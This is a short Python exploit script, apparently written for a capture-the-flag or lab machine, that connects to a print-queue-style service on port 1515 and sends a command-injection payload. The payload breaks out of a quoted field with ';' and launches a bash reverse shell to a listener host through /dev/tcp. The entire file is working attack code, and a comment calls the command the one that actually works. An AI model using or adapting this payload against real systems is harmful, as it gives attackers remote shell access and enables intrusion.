```Python
import socket
import logging

logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

class ExploitClient:
    def __init__(self, target_host, target_port, queue="archive_intake"):
        self.target_host = target_host
        self.target_port = target_port
        self.queue = queue

    def send_payload(self, payload):
        try:
            with socket.create_connection((self.target_host, self.target_port), timeout=5) as s:
                # Phase 1: Queue Init
                s.send(bytes([2]) + self.queue.encode() + b"\n")
                
                # Phase 2: Header
                content_bytes = payload.encode()
                header = bytes([2]) + str(len(content_bytes)).encode() + b"\n"
                s.send(header)
                
                # Wait for header ACK
                s.recv(1) 

                # Phase 3: The Payload
                s.send(content_bytes)
                logging.info("Payload sent. Check your listener!")

                # Final response
                response = s.recv(1024)
                logging.info(f"Server response: {response}")

        except Exception as e:
            logging.error(f"Error: {e}")

if __name__ == "__main__":
    # --- CONFIGURATION ---
    TARGET_IP = "10.129.136.252"
    TARGET_PORT = 1515
    LISTENER_IP = "10.10.16.77"
    LISTENER_PORT = 7777
    # ---------------------

    # The "One Command" that actually works
    # We use ; instead of && to ensure execution
    payload = f"\nJ A' ; bash -c 'bash -i >& /dev/tcp/{LISTENER_IP}/{LISTENER_PORT} 0>&1' ; echo '"

    logging.info(payload)
    client = ExploitClient(TARGET_IP, TARGET_PORT)
    client.send_payload(payload)

```
